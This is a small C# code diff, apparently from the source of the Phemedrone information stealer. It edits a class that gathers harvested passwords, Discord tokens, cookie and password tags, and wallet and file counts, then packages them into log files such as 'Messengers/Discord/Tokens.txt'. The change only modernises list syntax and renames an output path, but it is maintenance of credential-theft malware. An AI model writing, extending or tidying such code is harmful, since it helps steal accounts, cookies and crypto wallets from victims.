@@ -13,10 +13,10 @@ namespace Phemedrone
         public static int FilesCount = 0;
         public static int WalletsCount = 0;
         public static int ExtensionsCount = 0;
-        public static readonly List<string> PasswordList = new List<string>();
-        public static readonly List<string> DiscordList = new List<string>();
-        public static List<string> passwordstags = new List<string>();
-        public static List<string> cookiestags = new List<string>();
+        public static readonly List<string> PasswordList = new();
+        public static readonly List<string> DiscordList = new();
+        public static List<string> passwordstags = new();
+        public static List<string> cookiestags = new();
         public static IEnumerable<LogRecord> Finalize()
         {
             if (PasswordList.Count > 0)
@@ -32,7 +32,7 @@ namespace Phemedrone
             {
                 yield return new LogRecord
                 {
-                    Path = "Messengers/Discord Tokens.txt",
+                    Path = "Messengers/Discord/Tokens.txt",
                     Content = Encoding.UTF8.GetBytes(string.Join("\r\n", DiscordList.Distinct()))
                 };
             }
